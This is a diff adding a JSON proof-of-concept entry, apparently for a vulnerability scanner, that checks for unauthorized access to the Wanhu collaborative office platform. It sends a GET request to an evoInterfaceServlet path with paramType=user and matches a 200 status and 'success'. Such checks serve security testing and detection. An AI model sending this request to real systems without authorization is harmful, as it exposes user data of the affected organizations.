@@ -1,0 +1,14 @@
+{
+	"name":"万户协同办公平台未授权访问",
+	"tag":"wanhu",
+	"type":"other",
+	"poc":{
+		"pocGet":"/defaultroot/evoInterfaceServlet?paramType=user",
+		"header":{
+			"User-Agent":"Mozilla/5.0 (Linux;",
+			"content-type":"text/plain"
+		},
+		"status_code":"200",
+		"pattern":"(success)"
+	}
+}
